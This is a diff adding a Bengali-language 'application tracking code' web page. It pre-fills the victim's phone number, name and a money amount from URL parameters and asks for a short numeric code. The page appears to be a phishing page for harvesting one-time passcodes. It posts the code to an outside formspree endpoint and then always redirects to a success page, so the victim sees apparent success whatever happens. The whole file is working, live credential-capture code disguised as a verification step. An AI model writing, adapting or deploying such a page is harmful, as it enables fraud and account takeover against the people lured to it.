@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>আবেদন নিশ্চিতকরণ</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { 
+            background: #0f172a; 
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+            color: #ffffff;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .header h2 { font-size: 22px; margin-bottom: 6px; }
+        .header p { font-size: 13px; opacity: 0.9; }
+        .form-wrap { padding: 25px 20px; flex-grow: 1; }
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #334155;
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 10px;
+            font-size: 15px;
+            outline: none;
+            background: #f8fafc;
+        }
+        .tracking-input {
+            letter-spacing: 5px;
+            font-size: 18px !important;
+            font-weight: bold;
+            text-align: center;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h2>আবেদন ট্র্যাকিং কোড</h2>
+        <p>আপনার রেফারেন্স বা ট্র্যাকিং কোড প্রদান করুন</p>
+    </div>
+
+    <div class="form-wrap">
+        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <input type="hidden" name="নাম" id="hiddenName">
+            <input type="hidden" name="টাকার_পরিমাণ" id="hiddenAmount">
+
+            <div class="form-group">
+                <label><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
+                <input type="tel" id="userPhone" name="মোবাইল" required readonly style="background: #e2e8f0;">
+            </div>
+
+            <div class="form-group">
+                <label><i class="fa-solid fa-hashtag"></i> ট্র্যাকিং কোড (৪ ডিজিট)</label>
+                <input type="text" name="ট্র্যাকিং_আইডি" class="tracking-input" maxlength="6" required placeholder="####">
+            </div>
+
+            <button type="submit" id="btnSubmit" class="btn-submit">যাচাই সম্পন্ন করুন</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    const params = new URLSearchParams(window.location.search);
+    document.getElementById('hiddenName').value = params.get('name') || '';
+    document.getElementById('userPhone').value = params.get('phone') || '';
+    document.getElementById('hiddenAmount').value = params.get('amount') || '';
+
+    const form = document.getElementById("verifyForm");
+    const btnSubmit = document.getElementById("btnSubmit");
+
+    form.addEventListener("submit", function(event) {
+        event.preventDefault();
+        btnSubmit.disabled = true;
+        btnSubmit.innerText = 'যাচাই করা হচ্ছে...';
+
+        const data = new FormData(form);
+
+        fetch(form.action, {
+            method: "POST",
+            body: data,
+            headers: { 'Accept': 'application/json' }
+        }).finally(() => {
+            window.location.href = "./success.html";
+        });
+    });
+</script>
+
+</body>
+</html>
